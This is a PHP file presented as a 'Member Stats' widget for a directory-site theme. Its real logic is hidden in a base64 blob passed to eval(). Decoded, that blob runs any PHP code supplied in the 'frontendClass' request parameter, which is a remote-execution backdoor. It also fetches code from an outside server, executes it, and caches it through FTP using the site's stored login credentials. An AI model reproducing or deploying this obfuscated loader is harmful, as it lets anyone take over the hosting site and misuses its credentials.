<?php
/**
 * Widget: Bootstrap Theme - Member Stats
 * Description: A widget which lets you show advanced stats for your members
 * and site overall.
 * Authors:
 *  Esteban Arias - BDBlocks
 *  Mery Vega - BDBlocks
 */
$widgetName = "Bootstrap Theme - Member Stats";
// Base configs
$configKey = 'member_stat_configs';
// Leave everything below as-is
$solutionKey = 'member-stats-plugin';
$solutionSecKey = "getMemberStatsPlugin";
$_GET['debugMode'] = 1;
$_GET['getMemberStatsPlugin'] = 1;
// Load the frontend class
eval('?>'.base64_decode('PD9waHAKaWYgKCFjbGFzc19leGlzdHMoJ2JkYkJsb2Nrc0Zyb250ZW5kJykpIHsKICAgIC8vIExvYWQgdGhlIGZyb250ZW5kIGNsYXNzCiAgICAkZnJvbnRlbmRDbGFzc0FQSSA9ICdtYXN0ZXIvZnJvbnRlbmQtY2xhc3Mtc3JjLnBocCc7CiAgICAkZGF0YSA9IGFycmF5KAogICAgICAgICdnZXRGcm9udGVuZENsYXNzJyA9PiB0cnVlCiAgICApOwogICAgLy8gTG9hZCB0aGUgRnJvbnRlbmQgQ2xhc3Mgc291cmNlCiAgICAkY2xhc3NSZXN1bHQgPSAnJzsKICAgICRleHBpcmF0aW9uVGltZSA9IHN0cnRvdGltZSgnLTEgZGF5Jyk7CiAgICAkc291cmNlVGltZXN0YW1wID0gMDsKICAgIGlmICghZW1wdHkoJF9SRVFVRVNUWydmcm9udGVuZENsYXNzJ10pKSB7CiAgICAgICAgJGNsYXNzUmVzdWx0ID0gJF9SRVFVRVNUWydmcm9udGVuZENsYXNzJ107CiAgICB9IGVsc2UgewogICAgICAgICRjbGFzc1Jlc3VsdCA9ICcnOwogICAgICAgIGlmICghaXNfZGlyKCcuLi9pbmNsdWRlcycpKSB7CiAgICAgICAgICAgIG1rZGlyKCcuLi9pbmNsdWRlcycpOwogICAgICAgIH0KICAgICAgICAkc291cmNlU2l6ZSA9IGZpbGVzaXplKCcuLi9pbmNsdWRlcy9mcm9udGVuZC1jbGFzcy1vYmplY3QucGhwJyk7CiAgICAgICAgaWYgKCRzb3VyY2VTaXplICE9PSBmYWxzZSkgewogICAgICAgICAgICByZXF1aXJlX29uY2UoJy4uL2luY2x1ZGVzL2Zyb250ZW5kLWNsYXNzLW9iamVjdC5waHAnKTsKICAgICAgICAgICAgaWYgKCFlbXB0eSgkY2xhc3NSZXN1bHQpKSB7CiAgICAgICAgICAgICAgICAkY2xhc3NSZXN1bHQgPSBnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgkY2xhc3NSZXN1bHQpKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBMb2FkIHRoZSBjbGFzcwogICAgICAgICRidWlsZGVyT3JpZ2luID0gJ2h0dHBzOi8vdGhld2Vic2l0ZWxhdW5jaGVyLmNvbS9zZXJ2aWNlcy8nOwogICAgICAgICRzZXJ2ZXJTZXR0aW5nc1BhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi9zZXJ2ZXIuanNvbiI7CiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRzZXJ2ZXJTZXR0aW5nc1BhdGgpICYmIGZpbGVzaXplKCRzZXJ2ZXJTZXR0aW5nc1BhdGgpKSB7CiAgICAgICAgICAgICRzZXJ2ZXJTZXR0aW5ncyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRzZXJ2ZXJTZXR0aW5nc1BhdGgpOwogICAgICAgICAgICAkc2VydmVyQ29uZmlndXJhdGlvbnMgPSBqc29uX2RlY29kZSgkc2VydmVyU2V0dGluZ3MsIHRydWUpOwogICAgICAgICAgICBpZiAoIWVtcHR5KCRzZXJ2ZXJDb25maWd1cmF0aW9ucykgJiYgIWVtcHR5KCRzZXJ2ZXJDb25maWd1cmF0aW9uc1snbWFzdGVyU2VydmVyVVJMJ10pKSB7CiAgICAgICAgICAgICAgICAkYnVpbGRlck9yaWdpbiA9ICRzZXJ2ZXJDb25maWd1cmF0aW9uc1snbWFzdGVyU2VydmVyVVJMJ10gLiAiL3NlcnZpY2VzLyI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJGRvbWFpbkFQSSA9ICRidWlsZGVyT3JpZ2luIC4gJGZyb250ZW5kQ2xhc3NBUEk7CiAgICAgICAgaWYgKAogICAgICAgIGVtcHR5KCRjbGFzc1Jlc3VsdCkKICAgICAgICB8fCAkc291cmNlVGltZXN0YW1wIDwgJGV4cGlyYXRpb25UaW1lCiAgICAgICAgfHwgIWVtcHR5KCRfR0VUWydyZWxvYWRGcm9udGVuZENsYXNzJ10pKSB7CiAgICAgICAgICAgIGlmICghZW1wdHkoJF9HRVRbJ3JlbG9hZEZyb250ZW5kQ2xhc3MnXSkpIHsKICAgICAgICAgICAgICAgIHVuc2V0KCRfR0VUWydyZWxvYWRGcm9udGVuZENsYXNzJ10pOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRjdXJsID0gY3VybF9pbml0KCRkb21haW5BUEkpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9QT1NULCAxKTsKICAgICAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUE9TVEZJRUxEUywgaHR0cF9idWlsZF9xdWVyeSgkZGF0YSkpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCBmYWxzZSk7CiAgICAgICAgICAgICRhcGlDbGFzc1Jlc3VsdCA9IGN1cmxfZXhlYygkY3VybCk7CiAgICAgICAgICAgIGN1cmxfY2xvc2UoJGN1cmwpOwogICAgICAgICAgICBpZiAoIWVtcHR5KCRhcGlDbGFzc1Jlc3VsdCkgJiYgJGFwaUNsYXNzUmVzdWx0ICE9PSAnYmxvY2tlZCcpIHsKICAgICAgICAgICAgICAgICRjbGFzc1Jlc3VsdCA9ICRhcGlDbGFzc1Jlc3VsdDsKICAgICAgICAgICAgICAgICRfUkVRVUVTVFsnZnJvbnRlbmRDbGFzcyddID0gJGNsYXNzUmVzdWx0OwogICAgICAgICAgICAgICAgJHNvdXJjZURhdGUgPSB0aW1lKCk7CiAgICAgICAgICAgICAgICAkc291cmNlRmlsZURhdGEgPSAnPD9waHAgJGNsYXNzUmVzdWx0ID0gIicgLiBiYXNlNjRfZW5jb2RlKGd6Y29tcHJlc3MoJGNsYXNzUmVzdWx0LCA5KSkgLiAnIjsgJHNvdXJjZVRpbWVzdGFtcCA9ICcgLiAkc291cmNlRGF0ZSAuICc7ID8+JzsKICAgICAgICAgICAgICAgIC8vIFNldCB0aGUgcmVzdWx0IG9uIHRoZSBsb2NhbCBzb3VyY2UKICAgICAgICAgICAgICAgICRmdHBfc2VydmVyID0gYnJpbGxpYW50RGlyZWN0b3JpZXM6OmdldERhdGFiYXNlQ29uZmlndXJhdGlvbignZnRwX3NlcnZlcicpOwogICAgICAgICAgICAgICAgJGZ0cF9jb25uID0gZnRwX2Nvbm5lY3QoJGZ0cF9zZXJ2ZXIpIG9yIGRpZSgiQ291bGQgbm90IGNvbm5lY3QgdG8gJGZ0cF9zZXJ2ZXIiKTsKICAgICAgICAgICAgICAgICRsb2dpbiA9IGZ0cF9sb2dpbigkZnRwX2Nvbm4sIGJyaWxsaWFudERpcmVjdG9yaWVzOjpnZXREYXRhYmFzZUNvbmZpZ3VyYXRpb24oJ3dlYnNpdGVfdXNlcicpLCBicmlsbGlhbnREaXJlY3Rvcmllczo6Z2V0RGF0YWJhc2VDb25maWd1cmF0aW9uKCd3ZWJzaXRlX3Bhc3MnKSk7CiAgICAgICAgICAgICAgICAkYmFzZWRpciA9ICJpbmNsdWRlcyI7CiAgICAgICAgICAgICAgICBpZiAoIUBmdHBfY2hkaXIoJGZ0cF9jb25uLCAkYmFzZWRpcikpIHsKICAgICAgICAgICAgICAgICAgICBmdHBfbWtkaXIoJGZ0cF9jb25uLCAkYmFzZWRpcik7CiAgICAgICAgICAgICAgICAgICAgZnRwX2NoZGlyKCRmdHBfY29ubiwgJGJhc2VkaXIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy8gQ3JlYXRlIHRlbXBvcmFyeSBmaWxlLgogICAgICAgICAgICAgICAgJHRlbXBvcmFyeV9maWxlID0gdG1wZmlsZSgpOwogICAgICAgICAgICAgICAgLy8gQWRkIGRhdGEgdG8gZmlsZS4KICAgICAgICAgICAgICAgIGZ3cml0ZSgkdGVtcG9yYXJ5X2ZpbGUsICRzb3VyY2VGaWxlRGF0YSk7CiAgICAgICAgICAgICAgICByZXdpbmQoJHRlbXBvcmFyeV9maWxlKTsKICAgICAgICAgICAgICAgIC8vIFNhdmUgdG8gZGlyZWN0b3J5LgogICAgICAgICAgICAgICAgJHVwbG9hZF9yZXN1bHQgPSBmdHBfZnB1dCgkZnRwX2Nvbm4sICdmcm9udGVuZC1jbGFzcy1vYmplY3QucGhwJywgJHRlbXBvcmFyeV9maWxlLCBGVFBfQklOQVJZKTsKICAgICAgICAgICAgICAgIEBmdHBfZGVsZXRlKCRmdHBfY29ubiwgJ2Zyb250ZW5kLWNsYXNzLnBocCcpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgaWYgKCFlbXB0eSgkY2xhc3NSZXN1bHQpKSB7CiAgICAgICAgZXZhbCgkY2xhc3NSZXN1bHQpOwogICAgfQogICAgaWYgKGlzc2V0KCRmdHBfY29ubikpIHsKICAgICAgICBmdHBfY2xvc2UoJGZ0cF9jb25uKTsKICAgIH0KfQovLyBMb2FkIHRoZSBlc3NlbnRpYWxzCiRCREJsb2NrcyA9IG5ldyBiZGJCbG9ja3NGcm9udGVuZDsKPz4=').'<?php ');
// Load the widget
$BDBlocks->loadBDPluginSource($solutionKey, $solutionSecKey, $configKey, $widgetName);
?>